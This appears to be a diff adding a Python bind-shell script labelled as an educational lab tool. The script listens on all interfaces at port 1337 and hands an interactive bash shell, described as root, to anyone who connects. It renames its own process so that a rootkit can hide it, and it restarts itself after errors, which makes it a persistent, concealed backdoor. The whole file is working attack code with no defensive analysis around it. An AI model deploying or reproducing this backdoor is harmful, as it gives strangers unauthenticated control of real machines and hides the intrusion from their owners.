@@ -1,0 +1,29 @@
+#!/usr/bin/env python3
+# LAB BIND SHELL — educational only. Listens on 0.0.0.0:1337 and gives a
+# root shell to anyone who connects. Process name set to blacklodge_beacon
+# so the rootkit can hide it by prefix / port.
+import os, socket, subprocess, time
+try:
+    import ctypes
+    ctypes.CDLL("libc.so.6").prctl(15, b"blacklodge_beacon\0", 0, 0, 0)
+except Exception:
+    pass
+
+HOST, PORT = "0.0.0.0", 1337
+
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((HOST, PORT))
+        s.listen(5)
+        while True:
+            conn, addr = s.accept()
+            # drop into a shell; stdin/stdout/stderr redirected to the socket
+            os.dup2(conn.fileno(), 0)
+            os.dup2(conn.fileno(), 1)
+            os.dup2(conn.fileno(), 2)
+            subprocess.call(["/bin/bash", "-i"])
+            conn.close()
+    except Exception:
+        time.sleep(3)
